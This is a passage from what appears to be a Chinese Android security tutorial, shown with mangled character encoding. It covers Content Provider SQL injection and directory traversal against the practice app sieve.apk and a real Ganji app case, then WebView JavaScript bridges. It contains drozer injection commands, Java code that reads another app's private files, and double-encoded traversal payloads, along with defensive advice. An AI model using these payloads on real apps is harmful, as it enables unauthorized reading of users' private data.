Providerè¿›è¡Œå¢åˆ æ”¹æŸ¥æ“ä½œæ—¶ï¼Œç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œæœªé‡‡ç”¨å‚æ•°åŒ–æŸ¥è¯¢çš„æ–¹å¼ï¼Œå¯èƒ½ä¼šå¯¼è‡´sqlæ³¨å…¥æ”»å‡»ã€‚<br>æ‰€è°“çš„SQLæ³¨å…¥æ”»å‡»æŒ‡çš„æ˜¯æ”»å‡»è€…å¯ä»¥ç²¾å¿ƒæ„é€ selectionå‚æ•°ã€projectionå‚æ•°ä»¥åŠå…¶ä»–æœ‰æ•ˆçš„SQLè¯­å¥ç»„æˆéƒ¨åˆ†ï¼Œå®ç°åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹ä»Content Providerè·å–æ›´å¤šä¿¡æ¯ã€‚åº”è¯¥é¿å…ä½¿ç”¨SQLiteDatabase.rawQuery()è¿›è¡ŒæŸ¥è¯¢ï¼Œè€Œåº”è¯¥ä½¿ç”¨ç¼–è¯‘å¥½çš„å‚æ•°åŒ–è¯­å¥ã€‚ä½¿ç”¨é¢„ç¼–è¯‘å¥½çš„è¯­å¥æ¯”å¦‚SQLiteStatementï¼Œä¸ä»…å¯ä»¥é¿å…SQLæ³¨å…¥ï¼Œè€Œä¸”æ“ä½œæ€§èƒ½ä¹Ÿå¤§å¹…æé«˜ï¼Œå› ä¸ºå…¶ä¸ç”¨æ¯æ¬¡æ‰§è¡Œéƒ½è¿›è¡Œè§£æã€‚<br>å¦å¤–ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨query(),insert(),update(),å’Œdelete()æ–¹æ³•ï¼Œå› ä¸ºè¿™äº›å‡½æ•°ä¹Ÿæä¾›äº†å‚æ•°åŒ–çš„è¯­å¥ã€‚é¢„ç¼–è¯‘çš„å‚æ•°åŒ–è¯­å¥ï¼Œé—®å·å¤„å¯ä»¥æ’å…¥æˆ–è€…ä½¿bindString()ç»‘å®šå€¼ã€‚ä»è€Œé¿å…SQLæ³¨å…¥æ”»å‡»ã€‚</p><p><strong>drozerå…³äºSQLæ³¨å…¥çš„ç›¸å…³å‘½ä»¤</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æ£€æµ‹SQLæ³¨å…¥</span><br><span class="line"><span class="keyword">run</span> scanner.provider.injection -a åŒ…å</span><br><span class="line"></span><br><span class="line">æ£€æµ‹ç›®å½•éå†</span><br><span class="line"><span class="keyword">run</span> scanner.provider.traversal -a åŒ…å</span><br><span class="line"></span><br><span class="line">SQLæ³¨å…¥</span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> å…·ä½“uri + [--projection] [selection]</span><br><span class="line">ç¤ºä¾‹ï¼š <span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.DBContentProvider/Passwords/ </span></span><br><span class="line">--projection <span class="string">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure><p>æ¡ˆä¾‹ï¼šsieve.apk</p><ul><li><p>æ£€æµ‹SQLæ³¨å…¥<br><code>run scanner.provider.injection  </code>-<code>a &lt;åŒ…å&gt;</code><img src="/posts/f416437f.htm/image-20240923184807857.png" alt="image-20240923184807857"></p></li><li><p>æ„é€ sql</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ—å‡ºæ‰€æœ‰è¡¨ä¿¡æ¯|</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ—å‡ºè¯¥appè¡¨ä¿¡æ¯</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.sqltables</span> -<span class="selector-tag">a</span>  com<span class="selector-class">.mwr</span><span class="selector-class">.example</span>.sieve</span><br></pre></td></tr></table></figure></li></ul><h4 id="ç›®å½•éå†æ¼æ´">ç›®å½•éå†æ¼æ´</h4><p><strong>åŸç†ä»‹ç»</strong></p><p>Android Content Providerå­˜åœ¨æ–‡ä»¶ç›®å½•éå†å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºå¯¹å¤–æš´éœ²Content Providerç»„ä»¶çš„åº”ç”¨ï¼Œæ²¡æœ‰å¯¹Content Providerç»„ä»¶çš„è®¿é—®è¿›è¡Œæƒé™æ§åˆ¶å’Œå¯¹è®¿é—®çš„ç›®æ ‡æ–‡ä»¶çš„Content Query Uriè¿›è¡Œæœ‰æ•ˆåˆ¤æ–­ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥åº”ç”¨æš´éœ²çš„Content Providerçš„openFile()æ¥å£è¿›è¡Œæ–‡ä»¶ç›®å½•éå†ä»¥è¾¾åˆ°è®¿é—®ä»»æ„å¯è¯»æ–‡ä»¶çš„ç›®çš„</p><p><strong>æ¼æ´è§¦å‘çš„å‰ææ¡ä»¶</strong></p><p>å¯¹å¤–æš´éœ²çš„Content Providerç»„ä»¶å®ç°äº†openFile()æ¥å£<br>æ²¡æœ‰å¯¹æ‰€è®¿é—®çš„ç›®æ ‡æ–‡ä»¶Uriè¿›è¡Œæœ‰æ•ˆåˆ¤æ–­ï¼Œå¦‚æ²¡æœ‰è¿‡æ»¤é™åˆ¶å¦‚ï¼Œâ€œâ€¦/â€å¯å®ç°ä»»æ„å¯è¯»æ–‡ä»¶çš„è®¿é—®çš„Content Query Uri</p><p><strong>æ¼æ´å¤ç°</strong></p><p>æ¡ˆä¾‹ï¼š<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-044407">èµ¶é›†ç½‘Androidå®¢æˆ·ç«¯Content Providerç»„ä»¶ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</a></p><p><strong>æ¼æ´åˆ†æ</strong></p><p>èµ¶é›†ç½‘å®¢æˆ·ç«¯APPçš„å®ç°ä¸­å®šä¹‰äº†ä¸€ä¸ªå¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶çš„Content Providerç»„ä»¶ï¼Œé»˜è®¤çš„android:exported=â€œtrueâ€,å¯¹åº”com.ganji.android.jobs.html5.LocalFileContentProviderï¼Œè¯¥Providerå®ç°äº†openFile()æ¥å£ï¼Œé€šè¿‡æ­¤æ¥å£å¯ä»¥è®¿é—®å†…éƒ¨å­˜å‚¨app_webviewç›®å½•ä¸‹çš„æ•°æ®ï¼Œç”±äºåå°æœªèƒ½å¯¹ç›®æ ‡æ–‡ä»¶åœ°å€è¿›è¡Œæœ‰æ•ˆåˆ¤æ–­ï¼Œå¯ä»¥é€šè¿‡&quot;â€¦/&quot;å®ç°ç›®å½•è·¨è¶Šï¼Œå®ç°å¯¹ä»»æ„ç§æœ‰æ•°æ®çš„è®¿é—®ï¼ˆå½“ç„¶ï¼Œä¹Ÿå¯ä»¥è®¿é—®ä»»æ„å¤–éƒ¨å­˜å‚¨æ•°æ®ï¼Œåªæ˜¯æˆ‘ä»¬æ›´å…³å¿ƒç§æœ‰æ•æ„Ÿæ•°æ®ï¼‰ã€‚</p><p><strong>æ”»å‡»ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GJContentProviderFileOperations</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> getContentResolver().openInputStream(Uri.parse(<span class="string">&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;</span>));</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> in.read(buffer);</span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">            n = in.read(buffer);</span><br><span class="line">            Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        debugInfo(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ¡ˆä¾‹2ï¼šsieve.apk</strong></p><ul><li><p>æ£€æµ‹æ˜¯å¦æœ‰ç›®å½•éå†æ¼æ´<br><code>run scanner.provider.traversal -a &lt;åŒ…å&gt;</code><img src="/posts/f416437f.htm/image-20240923200141351.png" alt="image-20240923200141351"></p></li><li><p>è¯»å–ç³»ç»Ÿæ–‡ä»¶<br><code>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</code><img src="/posts/f416437f.htm/image-20240923200417923.png" alt="image-20240923200417923"></p></li><li><p>ä¸‹è½½ç³»ç»Ÿæ–‡ä»¶<br><code>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db f:/home/database.db</code><img src="/posts/f416437f.htm/image-20240923200859074.png" alt="image-20240923200859074"></p></li></ul><p>æ¡ˆä¾‹3ï¼š</p><p><strong>ç›®æ ‡ä»£ç </strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line"><span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span>;</span><br><span class="line"><span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">    File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,paramUri.getLastPathSegment());</span><br><span class="line">    <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ä»ç›®æ ‡ä»£ç ä¸­åˆ†æï¼Œè¿™æ®µä»£ç ä½¿ç”¨android.net.Uri.getLastPathSegment()ä»paramUriä¸­è·å–æ–‡ä»¶åï¼Œç„¶åå°†å…¶æ”¾ç½®åœ¨é¢„å®šä¹‰å¥½çš„ç›®å½•IMAGE_DIRECTORYä¸­ï¼Œå¦‚æœè¯¥URLæ˜¯encodedç¼–ç åçš„ï¼Œé‚£ä¹ˆå°†å¯èƒ½å¯¼è‡´ç›®å½•éå†æ¼æ´</p><p>Android4.3å¼€å§‹ï¼ŒUri.getLastPathSegment()å†…éƒ¨å®ç°è°ƒç”¨Uri.getPathSegments()</p><p>Uri.getPathSegmentsé¦–å…ˆä¼šé€šè¿‡getEncoded()è·å–ä¸€ä¸ªè·¯å¾„ï¼Œç„¶åä»¥â€/â€œä¸ºåˆ†éš”ç¬¦å°†pathåˆ†æˆç‰‡æ®µï¼Œæœ€åè°ƒç”¨decode()æ–¹æ³•è§£ç </p><p>å‡å¦‚æˆ‘ä»¬ä¼ é€’encodedç¼–ç åçš„urlç»™getLastPathSegment()ï¼Œç¼–ç åçš„åˆ†éš”ç¬¦å°±å˜æˆäº†%2F,ç»•è¿‡äº†å†…éƒ¨çš„åˆ†å‰²è§„åˆ™ï¼Œé‚£ä¹ˆè¿”å›çš„å°±å¯èƒ½ä¸æ˜¯çœŸæ­£æƒ³è¦çš„æ–‡ä»¶äº†ã€‚è¿™æ˜¯APIè®¾è®¡æ–¹é¢çš„é—®é¢˜ï¼Œç›´æ¥å¯¼è‡´äº†ç›®å½•éå†æ¼æ´</p><p>ä¸ºäº†é¿å…è¿™ç§æƒ…å†µå¯¼è‡´çš„ç›®å½•éå†æ¼æ´ï¼Œå¼€å‘è€…åº”è¯¥åœ¨ä¼ é€’ç»™getLastPathSegment()ä¹‹å‰è§£ç ï¼Œé‡‡ç”¨è°ƒç”¨ä¸¤æ¬¡getLastPathSegment()æ–¹æ³•çš„æ–¹å¼ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨æ˜¯ä¸ºäº†è§£ç ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨æœŸæœ›å¾—åˆ°æ­£ç¡®çš„å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span> <span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">è¿™ä¸ªç¼–ç åçš„URLï¼š ..%<span class="number">2F</span>..%<span class="number">2F</span>..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml  </span><br><span class="line">ç¬¬ä¸€æ¬¡è°ƒç”¨getLastPathSegment()ï¼Œä¼šè¿”å›../../../data/data/com.example.android.app/shared_prefs/Example.xmlã€‚  </span><br><span class="line">ç¬¬äºŒæ¬¡è°ƒç”¨getLastPathSegment()ä¼šè¿”å›Example.xml </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ç„¶è€Œæ”»å‡»è€…å¯ä»¥é‡‡ç”¨ä¸€ç§å«åš<span class="string">&quot;Double Encoding&quot;</span>çš„æŠ€æœ¯ï¼Œä½¿å¾—ç¬¬ä¸€æ¬¡è°ƒç”¨getLastPathSegment()åæ— æ³•è§£ç ã€‚</span><br><span class="line"> </span><br><span class="line">æ¯”å¦‚ä¸‹é¢ç»è¿‡<span class="type">double</span> encodedåçš„stringå°±å¯ä»¥ç»•è¿‡ä¸Šé¢è¿™ç§é˜²å¾¡</span><br><span class="line"> </span><br><span class="line">%252E%252E%<span class="number">252F</span>%252E%252E%<span class="number">252F</span>%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml</span><br><span class="line"> </span><br><span class="line">ç¬¬ä¸€æ¬¡è§£ç åï¼š %2E%2E%<span class="number">2F</span>%2E%2E%<span class="number">2F</span>%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml</span><br><span class="line"> </span><br><span class="line">ç¬¬äºŒæ¬¡è§£ç åï¼š ../../../data/data/com.example.android.app/shared_prefs/Example.xml</span><br><span class="line">ä»ä¼šå¯¼è‡´ç›®å½•éå†ã€‚æ‰€ä»¥ç®€å•çš„è§£ç åå†ä¼ äººä¹Ÿæ˜¯ä¸å¤Ÿçš„ï¼Œä»ç„¶éœ€è¦ä¸¥æ ¼æ ¡éªŒä»¥ç¡®ä¿pathæ˜¯æœŸæœ›çš„è·¯å¾„</span><br></pre></td></tr></table></figure><p><strong>å®‰å…¨é˜²æŠ¤</strong></p><ol><li>å°†ä¸å¿…è¦å¯¼å‡ºçš„Content Providerè®¾ç½®ä¸ºä¸å¯¼å‡º</li><li>å»é™¤æ²¡æœ‰å¿…è¦çš„openFile()æ¥å£</li><li>è¿‡æ»¤é™åˆ¶è·¨åŸŸè®¿é—®ï¼Œå¯¹è®¿é—®çš„ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„è¿›è¡Œæœ‰æ•ˆåˆ¤æ–­</li><li>è®¾ç½®æƒé™æ¥è¿›è¡Œå†…éƒ¨åº”ç”¨é€šè¿‡Content Providerçš„æ•°æ®å…±äº«</li></ol><h2 id="Webviewæ¼æ´"><strong>Webviewæ¼æ´</strong></h2><h3 id="WebViewåŸºæœ¬ä½¿ç”¨">WebViewåŸºæœ¬ä½¿ç”¨</h3><h4 id="æ‰“å¼€ç½‘é¡µ">æ‰“å¼€ç½‘é¡µ</h4><p><strong>æ§ä»¶æ³¨å†Œ</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/Wind_webview&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ä»£ç å®ç°</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å¾—æ§ä»¶</span></span><br><span class="line">       <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview);</span><br><span class="line">       <span class="comment">//è®¿é—®ç½‘é¡µ</span></span><br><span class="line">       webView.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">       <span class="comment">//ç³»ç»Ÿé»˜è®¤ä¼šé€šè¿‡æ‰‹æœºæµè§ˆå™¨æ‰“å¼€ç½‘é¡µï¼Œä¸ºäº†èƒ½å¤Ÿç›´æ¥é€šè¿‡WebViewæ˜¾ç¤ºç½‘é¡µï¼Œåˆ™å¿…é¡»è®¾ç½®</span></span><br><span class="line">       webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">               <span class="comment">//ä½¿ç”¨WebViewåŠ è½½æ˜¾ç¤ºurl</span></span><br><span class="line">               view.loadUrl(url);</span><br><span class="line">               <span class="comment">//è¿”å›true</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ç½‘ç»œæƒé™ï¼š</p><p><code>&lt;uses</code>-<code>permission android:name</code>=<code>&quot;android.permission.INTERNET&quot;` `/</code>&gt;</p><h4 id="è¿œç¨‹åŠ è½½ã€">è¿œç¨‹åŠ è½½ã€</h4><p>jsè°ƒç”¨Android</p><p>åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªjsæ–‡ä»¶,å‘½åattack.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//ç”±äºå¯¹è±¡æ˜ å°„ï¼Œæ‰€ä»¥è°ƒç”¨testå¯¹è±¡ç­‰äºè°ƒç”¨Androidæ˜ å°„çš„å¯¹è±¡</span></span></span><br><span class="line"><span class="language-javascript">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--ç‚¹å‡»æŒ‰é’®åˆ™è°ƒç”¨callAndroidå‡½æ•°--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¼€å¯ä¸€ä¸ªhttp_serverç›‘å¬</p><p><code>python -m http.server 8080</code></p><p>ç¼–å†™javaä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// è®¾ç½®ä¸Jsäº¤äº’çš„æƒé™</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// é€šè¿‡addJavascriptInterface()å°†Javaå¯¹è±¡æ˜ å°„åˆ°JSå¯¹è±¡</span></span><br><span class="line"><span class="comment">//å‚æ•°1ï¼šJavascriptå¯¹è±¡å</span></span><br><span class="line"><span class="comment">//å‚æ•°2ï¼šJavaå¯¹è±¡å</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJSç±»å¯¹è±¡æ˜ å°„åˆ°jsçš„testå¯¹è±¡</span></span><br><span class="line"><span class="comment">//loadData(String data, String mimeType, String encoding)</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// åŠ è½½JSä»£ç </span></span><br><span class="line"><span class="comment">// æ ¼å¼è§„å®šä¸º:file:///android_asset/æ–‡ä»¶å.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ipåœ°å€å¡«è‡ªå·±çš„/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æä¾›æ¥å£åœ¨Webviewä¸­ä¾›JSè°ƒç”¨</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰JSéœ€è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œè¢«JSè°ƒç”¨çš„æ–¹æ³•å¿…é¡»åŠ å…¥@JavascriptInterfaceæ³¨è§£</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Helloï¼Œ&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å¸¸ç”¨ç±»ä½¿ç”¨">å¸¸ç”¨ç±»ä½¿ç”¨</h4><h5 id="WebSettings"><strong>WebSettings</strong></h5><p>ä½œç”¨ï¼šå¯¹WebViewè¿›è¡Œé…ç½®å’Œç®¡ç†</p><p>é…ç½®æ­¥éª¤ï¼š</p><p>ç¬¬ä¸€æ­¥ï¼šæ·»åŠ è®¿é—®ç½‘ç»œæƒé™ï¼ˆAndroidManifest.xmlï¼‰</p><p><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</code></p><p>æ³¨æ„ï¼šä»Android 9.0ï¼ˆAPIçº§åˆ«28ï¼‰å¼€å§‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ç¦ç”¨æ˜æ–‡æ”¯æŒï¼Œä¼šæ˜¾ç¤º <code>ERR_CLEARTEXT_NOT_PERMITTED</code>ã€‚å› æ­¤httpçš„urlå‡æ— æ³•åœ¨webviewä¸­åŠ è½½ï¼Œå¯ä»¥åœ¨manifestä¸­applicationèŠ‚ç‚¹æ·»åŠ <code>android:usesCleartextTraffic=&quot;true&quot;</code>ã€‚</p><p>ç¬¬äºŒæ­¥ï¼šç”Ÿæˆä¸€ä¸ªWebViewç»„ä»¶ï¼ˆæœ‰ä¸¤ç§æ–¹å¼ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ–¹å¼1ï¼šç›´æ¥åœ¨åœ¨Activityä¸­ç”Ÿæˆ</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ–¹æ³•2ï¼šåœ¨Activityçš„layoutæ–‡ä»¶é‡Œæ·»åŠ webviewæ§ä»¶ï¼š</span></span><br><span class="line"><span class="type">WebView</span> 